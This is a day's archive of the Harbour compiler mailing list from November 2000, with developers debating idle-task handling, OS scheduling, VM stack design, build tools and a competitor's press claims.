From: harbour@lists.harbour-project.org (Guy Roussin)
Date: Fri Nov 24 05:02:02 2000
Subject: [Harbour] Unrecoverable error 9006
Message-ID: <3A1E3C56.F31628F0@teledetection.fr>

Hello,

if (and only if) i comment the line 103 in hbsetup.h like this :
/* #define HB_FM_STATISTICS */

i get this runtime error:
Unrecoverable error 9006: hb_xgrab can't allocate memory
Called from EVALEXPR(2703)
Called from GMETA(1162)
Called from MAIN(424)

-- 
Guy Roussin

From harbour@lists.harbour-project.org  Fri Nov 24 06:29:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Fri Nov 24 06:29:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEHADHAA.ron@profit-master.com>
References: <3A1D98C9.3849.15D9620A@localhost>
Message-ID: <3A1E5ECF.18297.36237DE@localhost>

On 24 Nov 2000, at 0:17, Ron Pinkas wrote:

> No. My proposal does allow any Idle Block to request reoccurring
> processing.

  But this requesting is not needed. It will require additional code 
changes for existing FT_ONIDLE() code for which our HB_IDLEADD() was 
designed to be compatible. This worked very well until your change. 
Idle tasks have to be called when an application is in an idle state. 
Waiting for keyboard input is an idle state regardless of its 
duration.
  If you want to create a wait states then create them. But don't 
remove existing functionality of idle states.

> 
> BTW, unless I'm missing something, your Clock *will* stop working, the
> second a key is pressed, or might not even begin, if say the GC
> consumed all the time between the beginning of the Wait State to the
> time a key was pressed.
> 
> My question therefore is, why would anyone select such an un-reliable
> avenue to perform such tasks? I would argue that  such tasks should be
> moved to more appropriates avenues.

  Why do you think that this is unreliable? It was reliable in 
Clipper and should and can be reliable in Harbour. Just give the 
programmer the right tools and I am sure that he/she will build the 
solution that meets his/her requirements instead meeting your 
imaginary assumptions.

> 
> My understanding of such feature was that it would be used to perform
> an occasional cleanup etc. Tasks that don't have to be performed at
> any specific time, or frequency.

  Please don't assume anything about a future usage. Just give the 
programmer the maximum of freedom and power. Don't limit this freedom 
with your assumptions what is the correct because you can be wrong 
(and in this case you are wrong). Don't bring your coding style that 
is good in write-once application solutions into a compiler used by 
many other programmers - into compiler that someone will want to 
extend. The very simple logic has been changed into something 
complicated that becomed an unusabe code.
  
  If someone will want to decrease granulity of background task then 
it can be very easy done with some static counter or timer placed 
inside the task.

> 
> Please note, I don't suggest we disallow reoccurring (per Wait State)
> Idle Tasks, just wondering whether this should be the default.

  Yes, Ron. You are not suggesting it. You have made it already and 
now you are wondering why other developers are upset.

Regards, Ryszard


From harbour@lists.harbour-project.org  Fri Nov 24 08:13:02 2000
From: harbour@lists.harbour-project.org (Przemyslaw Czerpak)
Date: Fri Nov 24 08:13:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <04a101c05590$3ddb55d0$0a0ac8c8@VECWS1>
References: <LOBBKAFMMFGJIKLMEPAKOEGADHAA.ron@profit-master.com> <04a101c05590$3ddb55d0$0a0ac8c8@VECWS1>
Message-ID: <20001124141145.A1074@uran.rcsoft.pl>

On Thu, 23 Nov 2000, Victor Szakats wrote:

> int WINAPI WinMain( HINSTANCE hInstance, 
>        HINSTANCE hPrevInstance, 
>        LPSTR lpCmdLine,
>        int nCmdShow )
> {
>  MessageBox( NULL, "CpuHog V1.0\n\nCopyright (C) 1996 Mark Russinovich\n"
>      "http://www.ntinternals.com", "CpuHog", MB_OK );
>  SetThreadPriority( GetCurrentThread(),
>    THREAD_PRIORITY_TIME_CRITICAL );
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
>  while(1);

The problem was that Windows NT allowed an userspace process to
enter in critical section wchich could not be interrupt.
Such API calls should work only for krnel (for device drivers, etc.)
This is not scheduler problem.
But remember: very often scheduler calculates time consumed by the
proces and if the aplication takes to much then receives shorter
time period. The schedluer is trying to balance time between
processes. So if harbour aplication dosen't release CPU when
is unnecesary then will make slower his forground work.

The secound problem:
THIS IS NOT CLIPPER AND DOS AND ONE USER PER COMPUTER
Very often other proceses in system could be next copies
of my aplication running by other users. I cannot determinate
which of them needs system resources. But OS yes. So harbour
aplication has to sleep in idle as often and as long as possible
becouse other user of the same program may runing very havy
functions.

In unicses there is a lot of system machanism wchich allow
to release CPU during waitng for system events ( eg. select(...) )
and when it apear aplication is waking up. It's important
in such moment to run the main task of aplication. If my
program was waiting for an information on serial port and
then has to send an answer in a short period (some connected
devices can have short timeout) Harbour cannot run other
idle proces like GC.

BTW In linux I don't need very much idle_task handled by harbour.
I can run other process with some comunication stream (eg. FIFO
queue) which will make all my background jobs and then sleep
for some period freeing CPU)

Conclusion: WE CANNOT THINK IN THE LINEAR WAY - OTHER PROCESS COULD
            BE THE SAME HARBOUR APLICATION. LET'S ALLOW TO RUN THEM

sorry for my english,
regars
Przemek

From harbour@lists.harbour-project.org  Fri Nov 24 08:55:04 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 24 08:55:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>
Message-ID: <009f01c0561e$57744860$0a0ac8c8@VECWS1>

Ron,


> I believe that we should *not* encourage the concept of a block that
> expects/requires to be evaluated multiple times per Wait State, for the
> simple reason, that it is not guaranteed to run even once! Thus such
> expectation/requirement (which can not be guaranteed), suggests that another
> approach/solution should be used instead.

There are many non-critical tasks which could still be run like that 
in an efficient way. You can also think about IDLETASK() as some 
kind of "light" threads (like Maurilio ? said), it's not as prefect as threads, 
but it's surely better than nothing, and in practice they can be quite useful, 
and it's also simple and platform independent.

> Since I personally, never used such mechanism, I admit my concept of what
> could be a good use for such feature is very limited. Can some one please
> provide a real world example (outside of the GC), that utilizes this
> feature?

There were at least five different example for the possible usages.

1. No, I don't see any benefit in that. (maybe someone could tell an example)
2. Repeating
3. If inevatable I think it should be per idle task block

Victor Szakats




From harbour@lists.harbour-project.org  Fri Nov 24 08:55:40 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 24 08:55:40 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas    <ron@profit-master.com>
References: <3A1D8FA7.28147.15B5B4CA@localhost> <3A1E2973.2A0CA294@libero.it>
Message-ID: <009e01c0561e$56d85680$0a0ac8c8@VECWS1>

Maurilio,


> I fear that under win32 (in particular 95 and 98) the real problem is
> that kernel is not reentrant so only one program can be inside kernel at
> any given time and this is the real bottleneck and the cause of poor
> performance.

I can assure you that WinNT is highly reentrant, otherwise it could 
not scale to multiprocessor systems, and the the overall multitasking 
performance would be very poor.

Without going into OS wars I've read once an article about multiCPU 
system bottlenecks compared in NT vs Linux, and it came out that 
NT scales better because it's more reentrant than Linux (simply put).
(To my knowledge Linux was enhanced a bit in that area till then.)

> PS. NT, before win2K, was a poor multitasker and a resource hog on its
> own. Now win2k multitasks much better but it is still a resource hog.
> :-)

I agree with the resource hog part, but I think that NT was almost as good 
multitasker as W2K is. The major difference is not between NT/2K but 
between W9x/ME and NT/2K, where the former cannot be seriously 
called a multitasker.

The problem is still not here though, because IMHO the solution is that 
the application developer is the best canditate to decide _when_ to 
release CPU time, the OS could only do guesswork in this area.

I mean how could the OS safely detect if my tight loop is for keyboard 
checking or slow serial port polling (for example) and not for the 
caluculation of some mathematical data. Of course I know that the first 
case is idle case, the second is not, but will the OS know that, too ?

Victor Szakats



From harbour@lists.harbour-project.org  Fri Nov 24 10:56:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Fri Nov 24 10:56:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-23 13:32 GMT+1
In-Reply-To: <3A1D6150.9A62F11E@libero.it>
Message-ID: <3A1E9E8B.14744.45B2ED6@localhost>

On 23 Nov 2000, at 19:26, Maurilio Longo wrote:

> if you have data waiting on a serial buffer I think you're better
> getting them instead of giving away your time slice. 

  Notice that an interrupt driven data retrieving will (have to be) 
be executed anyway because a hardware interrupt have the highest 
priority. 

> And note that as soon as your idle task calls an rdd to do I/O it
> could (and most probably will) block somewhere inside your operating
> system waiting for that I/O to complete and while it waits this
> completion it will surely be preempted by your OS which will switch to
> any other thread waiting to run (and if this other thread is of higher
> priority (say an MP3 player) then your harbour thread could receive
> next cpu slice _seconds_ later).

   Yes, harbour ,,thread'' can be executed with a delay - however the 
interrupt handler will be serviced immediately. All details related 
to serial port comunication can be handled inside an interrupt 
(checksum verification, XON/XOFF handling, etc). A harbour level idle 
task can read a final data only. So any (small) delays are not 
important. There were no problems even on 386 computers to service 
six serial ports using this method and there was no noticable 
degradation in handling user interactions.

> 
> Don't use DOS as an example for your comparisons, it's an enterely
> different matter.

  Of course, in other systems this method can be replaced with an 
event notification. However it doesn't change an idle tasks usage in 
other cases.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 24 11:04:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Fri Nov 24 11:04:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random  gpfs)
In-Reply-To: <200011231758_MC2-BBFF-338B@compuserve.com>
Message-ID: <3A1EA097.26618.4632CFB@localhost>

On 23 Nov 2000, at 17:58, John Skelton wrote:

> Keep it simple. <g>  Leave room for N locals, for large N.  Not long
> ago we were discussing (OK, not entirely seriously) a 1MB stack.
> Suppose we started with 100K instead.  And if there's not room for

  We will have to handle block crossing no mater how big a block will 
be. So creating a very large block will not help. On the other hand 
creating a big block for every function will be wasting of memory and 
it still will not guarantee that we will need an additional block. 

> (say) 1000 locals we allocate the next 100K stack block.  Surely that
> has to be plenty, yet it saves 800K even in this ridiculously bloated
> case.  Probably a typical app would in fact never go beyond the first
> block, so we just saved 900K. :-)
> 
> Er... I didn't check yet how big a LOCAL is (probably not Clipper's 14
> bytes), but maybe the idea is good enough.

  It is 16 bytes so far.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 24 11:08:02 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Fri Nov 24 11:08:02 2000
Subject: [Harbour] Alaska's site
References: <3A1D37F3.78422828@libero.it>
Message-ID: <002701c05638$d40182c0$456410ac@jharrier>

Steffen states :
----------------------------------
Harbour is currently far away from being complete. It is unknown when/if it
will be capable to deliver Clipper compatibility. The milestones achieved in
this project so far allow us to forecast another 12-18 months until Clipper
(text mode) compatibility may be reached, and additional 12-36 months to
deliver reliability and compatibility like Xbase++ has today. I.e. we are
talking about 2-4 years.
-----------------------------------

Is this "wishful thinking" or a "matter of fact"? Maybe both, or none!
I am personally wishing :
for the_first
    else
the_effort_is = nil.

Harrier

----- Original Message -----
From: "Maurilio Longo" <maurilio.longo@libero.it>
To: <harbour@lists.harbour-project.org>
Sent: Thursday, November 23, 2000 11:29 AM
Subject: [Harbour] Alaska's site


> They're talking about us (here and there) :-)
>
>
> http://www.alaska-software.com/e/press/articles.html#nov16
>
>
> regards.
>
>
> --
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Fri Nov 24 12:10:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 12:10:04 2000
Subject: [Harbour] Alaska's site
References: <3A1D37F3.78422828@libero.it> <002701c05638$d40182c0$456410ac@jharrier>
Message-ID: <3A1EA078.C94B6D0E@libero.it>

Juan,

I think he is not too far off. We don't have RDDs, we don't have
threads, we don't have a GUI (fivewin is only for win32), we don't have
a debugger (profiler is not a top issue at this point).

I think that we have some reliability (I have harbour utilities which
run for days without problems) so, maybe, we don't need 2, 3 years to
improve this.

regards.


Juan Agustin Barriga ha scritto:
> 
> Steffen states :
> ----------------------------------
> Harbour is currently far away from being complete. It is unknown when/if it
> will be capable to deliver Clipper compatibility. The milestones achieved in
> this project so far allow us to forecast another 12-18 months until Clipper
> (text mode) compatibility may be reached, and additional 12-36 months to
> deliver reliability and compatibility like Xbase++ has today. I.e. we are
> talking about 2-4 years.
> -----------------------------------
> 
> Is this "wishful thinking" or a "matter of fact"? Maybe both, or none!
> I am personally wishing :
> for the_first
>     else
> the_effort_is = nil.
> 
> Harrier
> 
> ----- Original Message -----
> From: "Maurilio Longo" <maurilio.longo@libero.it>
> To: <harbour@lists.harbour-project.org>
> Sent: Thursday, November 23, 2000 11:29 AM
> Subject: [Harbour] Alaska's site
> 
> > They're talking about us (here and there) :-)
> >
> >
> > http://www.alaska-software.com/e/press/articles.html#nov16
> >
> >
> > regards.
> >
> >

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 12:43:02 2000
From: harbour@lists.harbour-project.org (Marek Paliwoda)
Date: Fri Nov 24 12:43:02 2000
Subject: Odp: [Harbour] getting old CVS snapshots
References: <200011221748_MC2-BBD1-BEE7@compuserve.com>
Message-ID: <000001c0563d$fb7de6e0$47b472c3@map>

>[To All]
>
>Can I fetch a CVS as it was (say) 3 weeks ago?  How? :-)
>
>Something changed a while ago and I'd like to try to figure out when,
>and thus which change(s) may be behind it.
>
>If the details are in cvs.html please tell me the part concerned. :-)
>
>John.

I have snapshoots in a zip format from an ftp site,
dated, among others, as listed below :

07/15/2000  07/27/2000  08/06/2000  08/07/2000
08/20/2000  09/02/2000  09/09/2000  09/30/2000
10/12/2000  10/19/2000  10/30/2000  12/11/2000
17/11/2000




From harbour@lists.harbour-project.org  Fri Nov 24 13:12:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 24 13:12:02 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <3A1EA078.C94B6D0E@libero.it>; from maurilio.longo@libero.it on Fri, Nov 24, 2000 at 06:08:08PM +0100
References: <3A1D37F3.78422828@libero.it> <002701c05638$d40182c0$456410ac@jharrier> <3A1EA078.C94B6D0E@libero.it>
Message-ID: <20001124174139.X26952@hagbard.davep.org>

On Fri, Nov 24, 2000 at 06:08:08PM +0100, Maurilio Longo wrote:

> I think he is not too far off. We don't have RDDs, we don't have threads,
> we don't have a GUI (fivewin is only for win32), 

More importantly: we don't have a cross platform, free software GUI[1]
layer. Obviously, non-free tools to provide this sort of thing are fine but
even a truely cross-platform tool of this nature wouldn't make harbour
complete in that department if "has GUI library" is seen as a yardstick.

That said, the availability of, or lack, a feature in harbour is a measure
of how badly someone wants it. If something doesn't exist in harbour then
obviously nobody wants it bad enough to make it available.

> I think that we have some reliability (I have harbour utilities which run
> for days without problems) so, maybe, we don't need 2, 3 years to improve
> this.

What did raise my eyebrow was the figure of 12-18 months until "Clipper
(text mode) compatibility may be reached". I wonder what the measure there
is?

-----
[1] Felipe: Graphical User Interface. ;-)

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 24 13:18:02 2000
From: harbour@lists.harbour-project.org (Felipe G. Coury)
Date: Fri Nov 24 13:18:02 2000
Subject: [Harbour] Alaska's site
References: <3A1D37F3.78422828@libero.it> <002701c05638$d40182c0$456410ac@jharrier> <3A1EA078.C94B6D0E@libero.it> <20001124174139.X26952@hagbard.davep.org>
Message-ID: <005001c0564c$0d2c3c80$3c01a8c0@creation>

Dave,

> > I think he is not too far off. We don't have RDDs, we don't have
threads,

You forgot: RDD = Replaceable Database Driver

Gotcha!

Regards,

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
http://www.creation.com.br

--------------------------------------------
Visite o GuiaBrasil.Net:
http://www.guiabrasil.net
--------------------------------------------



From harbour@lists.harbour-project.org  Fri Nov 24 13:36:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 24 13:36:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-24 19:22 GMT+1
Message-ID: <3A1EB307.BD159690@libero.it>

2000-11-24 19:22 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * contrib/mysql/tmysql.prg
      + ::FieldGet() and ::FieldPut() methods now accept a field name as
field identifier and not
        only a field number. This makes easier setting/getting field
values.
        ie oRow:FieldPut(oRow:FieldPos("my field"), xValue)) becomes
oRow:FieldPut("my field", xValue)
   * contrib/mysql/tsqlbrw.prg
      ! small changes
-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 24 13:42:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 13:42:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1E5ECF.18297.36237DE@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEHDDHAA.ron@profit-master.com>

Ryszard,

> > No. My proposal does allow any Idle Block to request reoccurring
> > processing.
>
>   But this requesting is not needed. It will require additional code
> changes for existing FT_ONIDLE() code for which our HB_IDLEADD() was
> designed to be compatible. This worked very well until your change.
> Idle tasks have to be called when an application is in an idle state.
> Waiting for keyboard input is an idle state regardless of its
> duration.
>   If you want to create a wait states then create them. But don't
> remove existing functionality of idle states.

Ryszard, for the Nth time, my change was a minor change, far from
finalizing, or dictating the way Harbour should handle Wait States.

Once this change was posted, it raised a very simple issue, whether Idle
Blocks should or should not run repeatedly per Wait State.

When I made my change I did *not* know there might be code block expecting
such behavior. Had I known, I obviously would not post such change. Instead
I would have offered some other solution, which attempts to address both
needs.

Please note that FT_ONIDLE is *not* part of Clipper, so I would recommend we
proceed cautiously, without any rush or prejudice.

I on my part will change the default behavior to allow repeating processing.
In the hope we may then have productive review of all the input and
concerns.


> > BTW, unless I'm missing something, your Clock *will* stop working, the
> > second a key is pressed, or might not even begin, if say the GC
> > consumed all the time between the beginning of the Wait State to the
> > time a key was pressed.
> >
> > My question therefore is, why would anyone select such an un-reliable
> > avenue to perform such tasks? I would argue that  such tasks should be
> > moved to more appropriates avenues.
>
>   Why do you think that this is unreliable? It was reliable in
> Clipper and should and can be reliable in Harbour. Just give the
> programmer the right tools and I am sure that he/she will build the
> solution that meets his/her requirements instead meeting your
> imaginary assumptions.

I did explain exactly why this might not be reliable, yet you again insist
on converting every argument we might have to  some personal war. Please try
to tone yourself down. We are not going to benefit from such personal
statements.

> > Please note, I don't suggest we disallow reoccurring (per Wait State)
> > Idle Tasks, just wondering whether this should be the default.
>
>   Yes, Ron. You are not suggesting it. You have made it already and
> now you are wondering why other developers are upset.

Right, I forgot you must know better, my intentions, my feelings, and even
my wonders.

Ron


From harbour@lists.harbour-project.org  Fri Nov 24 14:42:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 24 14:42:02 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <005001c0564c$0d2c3c80$3c01a8c0@creation>; from fcoury@creation.com.br on Fri, Nov 24, 2000 at 04:23:24PM -0300
References: <3A1D37F3.78422828@libero.it> <002701c05638$d40182c0$456410ac@jharrier> <3A1EA078.C94B6D0E@libero.it> <20001124174139.X26952@hagbard.davep.org> <005001c0564c$0d2c3c80$3c01a8c0@creation>
Message-ID: <20001124194111.A26952@hagbard.davep.org>

On Fri, Nov 24, 2000 at 04:23:24PM -0300, Felipe G. Coury wrote:
> Dave,
> 
> > > I think he is not too far off. We don't have RDDs, we don't have
> > > threads,
> 
> You forgot: RDD = Replaceable Database Driver

But I didn't write that text.

> Gotcha!

Gotcha back.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 24 16:06:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 24 16:06:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEHDDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEHEDHAA.ron@profit-master.com>

2000-11-24 12:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * include/hbset.h
   * include/set.ch
   * source/pp/pptable.c
     + Added _SET_IDLEREPEAT = 101
   * source/rtl/set.c
     + Added support for SET( _SET_IDLEREPEAT ) - Default is .T.

   * source/rtl/idle.c
     - Removed HB_IDLE_RESET()
     * Changed handling of Idle Process to default to REPEAT.

   * tests/onidle.prg
     - Removed call to HB_IDLE_RESET()

   + tests/testidle.prg
     + New test of Idle Blocks in default (REPEAT) mode and optional NON
REPEAT mode.

/* I suggest we add HB_IDLEALL() and rename HB_IDLESTATE() to HB_IDLESTEP()
*/


From harbour@lists.harbour-project.org  Fri Nov 24 17:00:05 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Fri Nov 24 17:00:05 2000
Subject: [Harbour] 2000-11-25 22:51 UTC+0100 jfl (mafact) <jfl@mafact.com>
Message-ID: <200011242159.WAA13119@pegasus.wanadoo.be>

2000-11-25 22:51 UTC+0100 jfl (mafact) <jfl@mafact.com>
   * source/rdd/rddcpy.c
     * added missing explicit cast needed by VC++


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Fri Nov 24 17:17:02 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Fri Nov 24 17:17:02 2000
Subject: [Harbour] VC++ harbour need bison 1.28 (or at last greater than 1.25)
Message-ID: <202011242201.0AOM1HA11400@localhost.localdomain>

I just forgot to say that to build HARBOUR with VC++ 6.0, you 
need a more recent version of bison than one wich is published on 
the site. I successfully used 1.28 (thankx John).

See you all,

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Fri Nov 24 17:50:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 24 17:50:04 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011241748_MC2-BC07-7456@compuserve.com>

[To Przemyslaw Czerpak]

"Windows NT allowed an userspace process to
enter in critical section wchich could not be interrupt."

I think that's _false_.  Please refer to my previous message about
this.

John.

From harbour@lists.harbour-project.org  Fri Nov 24 18:47:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 24 18:47:02 2000
Subject: [Harbour] Alaska's site
Message-ID: <200011241846_MC2-BC02-9EE2@compuserve.com>

Harrier,

"Steffen states"

I wonder why?  Maybe Harbour is good enough as to be worth worrying
about. :-)

"Harbour is currently far away from being complete"

Maybe.  Some parts certainly aren't complete.  OTOH, quite a lot of
it works very well.  (Except my temporary [I hope] build problems. <g>)

"It is unknown when/if it will be capable to deliver Clipper
compatibility."

True, I suppose.  OTOH, Xbase++ is not as compatible as they claim. :-(

"The milestones achieved in this project so far allow us to forecast
another 12-18 months until Clipper (text mode) compatibility may be
reached"

I've only 28 years of experience of s/w development.  Clearly he knows
better than me because I am unable to estimate the timescale.

"and additional 12-36 months to deliver reliability and compatibility
like Xbase++ has today"

Same comment as I made before, except: Xbase++ has serious problems
both in its _lack_ of compatibility with Clipper & Class(y), and in
its design/implementation of OOP (which is sub-standard).  Harbour's
OOP is better!  (Thanks Jean!!  And others. <g> [1])

I can't speak about reliability for either product at this early
stage (Clip-4-Win is a big, fully-featured product, so does not port
instantly and cannot be tested instantly).

---

Harrier> Is this "wishful thinking" or a "matter of fact"?

It looks like marketing BS to me.  Call it wishful thinking if you
like. <g>

If you want cheering up [2], I'm working on Harbour because it
improved so much during the time I waited and waited and waited for
Xbase++ improvements that Harbour began to look viable.  I'm still
waiting for Xbase++ improvements.  Harbour is improving much faster,
and as a result I'm still here [3].

[1] the design is, but it's not fully implemented - yet
[2] well, I'm hoping it cheers you <g>
[3] this may not be entirely good news <BG>

John.

From harbour@lists.harbour-project.org  Fri Nov 24 18:48:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 24 18:48:03 2000
Subject: Odp: [Harbour] getting old CVS snapshots
Message-ID: <200011241846_MC2-BC02-9EE8@compuserve.com>

Marek,

I'll try some. <g>  Thanks!

John.

From harbour@lists.harbour-project.org  Fri Nov 24 18:48:52 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 24 18:48:52 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011241846_MC2-BC02-9EE3@compuserve.com>

Ryszard,

"We will have to handle block crossing no mater how big a block will =

be"

I said so.

"So creating a very large block will not help"

It will help a lot.  Normal apps will never allocate any beyond the
original block, and will thus run faster.  Apps which need more than
one stack block will also work, but the advantage (see below) is that
almost all of the current Harbour code will not need to change.

"On the other hand creating a big block for every function"

I didn't suggest that.

I suggested making sure before calling each function that there is
plenty of room.  If not, allocate another (large) block.

The underlying idea is to rarely allocate (or free) blocks, and to
have all the params & locals for a function be in only _one_ block.
The exact details of getting that to occur need arranging, but surely
the concept is simple.  If implemented, it would mean almost all
functions would need no change from the code they have now, despite
this new more-capable stack.

Maybe this idea can't be implemented, or is wrong in some way, but
what you pointed out don't appear to be actual problems.

John.

From harbour@lists.harbour-project.org  Fri Nov 24 18:52:10 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Fri Nov 24 18:52:10 2000
Subject: [Harbour] VC++ harbour need bison 1.28 (or at last greater than 1.25)
In-Reply-To: <202011242201.0AOM1HA11400@localhost.localdomain>
Message-ID: <NCBBJKNMIDPJNLJCHCHIEEIEFJAA.harbour@winfakt.com>

JF,

Can you send version 1.28 to me so I can upate the Web Page.

Thanks

regards,

Patrick Mast
www.Patrick.Be.kz


> -----Oorspronkelijk bericht-----
> Van: harbour-admin@lists.harbour-project.org
> [mailto:harbour-admin@lists.harbour-project.org]Namens JF Lefebvre
> Verzonden: vrijdag 24 november 2000 23:17
> Aan: harbour@lists.harbour-project.org
> Onderwerp: [Harbour] VC++ harbour need bison 1.28 (or at last greater
> than 1.25)
> 
> 
> I just forgot to say that to build HARBOUR with VC++ 6.0, you 
> need a more recent version of bison than one wich is published on 
> the site. I successfully used 1.28 (thankx John).
> 
> See you all,
> 
> Best regards,
> 
> J. Lefebvre,
> Bruxelles,
> Belgium
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 

From harbour@lists.harbour-project.org  Fri Nov 24 19:21:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Fri Nov 24 19:21:02 2000
Subject: [Harbour] VC++ harbour need bison 1.28 (or at last greater than 1.25)
References: <NCBBJKNMIDPJNLJCHCHIEEIEFJAA.harbour@winfakt.com>
Message-ID: <002b01c05675$7b6bd240$0100007f@sl.conex.net>

Patrick


> JF,
>
> Can you send version 1.28 to me so I can upate the Web Page.

I´ve already tested bison 1.28 with Bcc 5.5. harbour.exe don´t work is bison
1.28 is used

Regards

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Fri Nov 24 19:22:04 2000
From: harbour@lists.harbour-project.org (aacker)
Date: Fri Nov 24 19:22:04 2000
Subject: [Harbour] Alaska's site
References: <200011241846_MC2-BC02-9EE2@compuserve.com>
Message-ID: <000f01c05675$9e33c850$6601a8c0@c765036b>

Hi John,

Just thought I'd pop in to say hi to everyone!

If Steffen is talking about Harbour.... there's only one reason... he's
worried about it.  And the fact that Steffen is talking about the
competition at all ( Harbour and Vdb ).... he must be in a fairly desperate
state.  I know him well enough to know that if he was feeling good about
Xbase++ and it's future... he would never even think about talking about
what he sees as competition.

Anyway, I find the entire thing fairly funny.  ( and yes you're right, xbase
is _way_ away from being a decent Clipper clone and not even close to
Clipper / Classy.  As far as a windows dev system....both Clip4Win and
FiveWin blow it away for speed, stability and class design.

Al

Al Acker,President,  Editor
Acker Consulting, Inc.
http://www.afaonline.com
The Xbase Files Magazine
http://www.thexbasefiles.com

>


From harbour@lists.harbour-project.org  Fri Nov 24 19:43:02 2000
From: harbour@lists.harbour-project.org (Alejandro de Garate)
Date: Fri Nov 24 19:43:02 2000
Subject: [Harbour] missing mails?
Message-ID: <F300YTlwzBS7jMUs1ez000046d0@hotmail.com>

This is a multi-part message in MIME format.

------=_NextPart_000_48ae_30d4_1060
Content-Type: text/plain; format=flowed

Phil:
I send to you (ziped) one of the last digest I receive: #123.
You can see on the subject that this digest have 15 mail
messages inside, but when you read the body you only see 11.
Where are the missing mails ? It occurs often.
Regards
Alejandro
_____________________________________________________________________________________
Get more from the Web.  FREE MSN Explorer download : http://explorer.msn.com

------=_NextPart_000_48ae_30d4_1060
Content-Type: application/x-zip-compressed; name="dig1_123.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="dig1_123.zip"

UEsDBBQAAAAIAAKXeClFETprRyoAALfyAAAMAAAAZGlnMV8xMjMuaHRt7Fx7
Uxs5Ev87U5XvoPXWGtjz+wUYTJaACb7lVdjZ3NXWlkueke1ZZkZzI42N9+6+
+3VLGr+wCQRytwehEtujR3frp1Y/JNn7Q+l7B2+t/SGjDrzDJ+lKjx2cculT
1yMn3HNYVCetoMdv9/O6EloJO3JDSTwaDGI6YI3U73REdWEK6vtxYEuXB8S/
